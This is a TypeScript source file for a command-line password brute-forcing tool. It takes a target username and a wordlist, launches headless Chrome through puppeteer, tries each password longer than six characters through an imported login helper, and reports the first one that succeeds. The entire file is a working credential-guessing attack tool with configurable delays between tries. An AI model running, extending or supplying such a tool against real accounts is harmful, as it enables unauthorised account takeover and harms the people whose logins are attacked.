import chalk from "chalk";
import yargs from "yargs";
import fs from "fs";
import puppeteer from "puppeteer";
import { checkInternet, login } from "./utils.js";

const red = `[${chalk.red("*")}] `;

const delay = (time: number | undefined) => {
	return new Promise(function(resolve) { 
		setTimeout(resolve, time)
	});
}

const opt = yargs(process.argv.slice(2))
	.usage("\nUsage: ./index.js -t <target> -w <wordlist>")
	.option("t", {
		alias: "target",
		describe: "The target user.",
		type: "string",
		demandOption: true
	})
	.option("w", {
		alias: ["wl", "wordlist"],
		description: "The wordlist file path.",
		type: "string",
		demandOption: true
	})
	.option("exec", {
		alias: "executable",
		description: "The path to the Chrome executable.",
		type: "string",
		default: "/usr/sbin/google-chrome-stable",
		demandOption: false
	})
	.option("d", {
		alias: "delay",
		description: "The delay between each password attempt.",
		type: "number",
		default: 1000,
		demandOption: false
	})
	.help(true)
	.parseSync();

const main = async () => {
	const target = opt.t ?? opt.target;
	const wordlist = opt.w ?? (opt.wl ?? opt.wordlist);
	const executable = opt.exec ?? opt.executable;
	const delayTime = opt.d ?? Number(opt.delay);
	const opts = [target, wordlist];
	let passwds = [];

	if (opts.some((opt) => opt !== undefined || opt !== null)) {
		if ((await checkInternet()) === false) {
			console.log(red + "No internet connection.");
			process.exit(1);
		}

		if (wordlist) {
			if (!fs.existsSync(wordlist)) {
				console.log(red + "The wordlist file does not exist.");
				process.exit(1);
			}

			passwds = fs.readFileSync(wordlist, "utf-8").split(/\r?\n/);

			for (let passwd of passwds) {
				if (passwd.length <= 6) continue;

				console.log(`[ ${chalk.yellow("INFO")} ] ` + `Trying password ${chalk.bold(passwd)}.`);

				const browser = await puppeteer.launch({
					executablePath: executable,
				});
				const loginTest = login(target, passwd, browser);

				if ((await loginTest) === false) {
					console.log(`[ ${chalk.red("FAIL")} ] ` + `${passwd} is incorrect.`);
					delay(delayTime);
				} else {
					console.log(`[ ${chalk.red("PASS")} ] ` + `${passwd} is correct.`);
					console.log(`[ ${chalk.red("PASS")} ] ` + `Successfully logged in as ${target} with password ${chalk.bold(passwd)}.}`);
					process.exit(0);
				}

				await browser.close();
			}
		}
	}
};

main();
